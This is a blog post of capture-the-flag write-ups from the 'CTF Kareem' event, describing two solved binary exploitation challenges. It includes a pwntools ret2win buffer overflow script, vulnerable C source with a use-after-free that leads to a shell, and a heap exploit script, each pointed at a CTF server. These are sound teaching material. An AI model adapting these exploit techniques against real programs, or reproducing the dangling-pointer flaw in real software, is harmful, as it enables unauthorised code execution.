---
title: CTF Kareem Writeups
description: This is a writeup of the challenges I have solved during the CTF kareem organized by Securinet TEKUP.
author: alternox
date: 2025-03-15 12:00:00 +0000
categories: [Blogging, Writeups]
tags: [Writeups]
render_with_liquid: false
image:
  path: /assets/img/ctfkareem2025/ctfkareemlogo.jpg
---

بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ


## Event description

CTF Kareem was a CTF orgnanized by Securinets TEKUP During Ramadhan, an overnight CTF for about 10.30 Hours, me and my team played as "Kaskrout b tey" and landed the first place.

![Scoreboard](/assets/img/ctfkareem2025/scoreboard.jpg)

## Binary Exploitation
### The River's Daughter
Challenge: 
![First Pwn Task](/assets/img/ctfkareem2025/pwntask1.png)

This is a simple ret2win challenge, so we do the usual, calculating the offset then getting the win address:

```python
#!/bin/python3
from pwn import *

local = False
name = 'main' 
e = ELF(name)
if local:
	p = process(name)
else:
	p = remote("51.77.140.155", 1329)
rop = ROP(e)

ret= 0x000000000040101a
win = 0x000000000040132d

payload = cyclic(64+8)
payload += p64(win+1)
p.recv()
p.sendline(payload)
p.interactive()
```

![First Pwn Task](/assets/img/ctfkareem2025/pwntask1solved.png)

flag : `Securinets{sh3_1s_th3_FL4G}`

### Patrick Bateman
Challenge: 
![First Pwn Task](/assets/img/ctfkareem2025/pwntask2.png)

This challenge was a bit tricky, but it had the cource code attached to it:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

typedef struct string {
    uint64_t length;
    char *data;
    void (*print_string) (char*);
}string;

void hacked() {
    system("/bin/sh");  
}

void print_string(char* s){
    printf("%s", s);
}

int main() {
    string *s = malloc(sizeof(string));  
    if (s == NULL) {
        perror("malloc failed");
        return 1;
    }

    puts("welcome patrick give the string length: ");
    scanf("%u", &s->length);

    s->data = malloc(s->length + 1);
    if (s->data == NULL) {
        perror("malloc failed");
        return 1;
    }
    memset(s->data, 0, s->length + 1);

    puts("Enter something");
    read(0, s->data, s->length);
    s->print_string = print_string;
    free(s->data);  
    free(s);        

    char *s2 = malloc(24);  
    if (s2 == NULL) {
        perror("malloc failed");
        return 1;
    }

    puts("Enter more");
    read(0, s2, 24);

    printf("well? this is your thing\n");
    s->print_string(s->data);

    free(s2);
    return 0;
}
```

solver: 

```python
#!/bin/python3
from pwn import *
local = False
name = 'heap' 
e = ELF(name)

if local:
	p = process(name)
else:
	p = remote("51.77.140.155", 1403)

rop = ROP(e)

win = 0x0000000000401289

p.recv()
p.sendline(b'8')
p.recv()
p.sendline(cyclic(7))
p.recv()
p.sendline(cyclic(16) + p64(0x0401289))
p.interactive()

```
